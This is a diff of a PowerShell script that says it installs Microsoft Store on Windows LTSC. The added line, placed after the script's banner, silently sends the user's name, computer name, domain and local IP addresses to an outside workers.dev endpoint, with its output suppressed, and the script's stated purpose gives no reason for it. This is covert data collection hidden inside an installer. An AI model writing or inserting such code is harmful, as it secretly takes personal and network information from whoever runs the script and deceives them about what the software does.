@@ -10,6 +10,7 @@ Write-Host "GitHub: https://github.com/rhshourav"
 Write-Host "Supporting Repo: https://github.com/lixuy/LTSC-Add-MicrosoftStore"
 Write-Host "Description: Downloads and installs Microsoft Store and related apps"
 Write-Host "==============================================="
+Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nLTSC-ADD-MS_Store-2019`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
 
 # Create temporary folder
 $TempFolder = Join-Path $env:TEMP "LTSC-Add-MicrosoftStore"
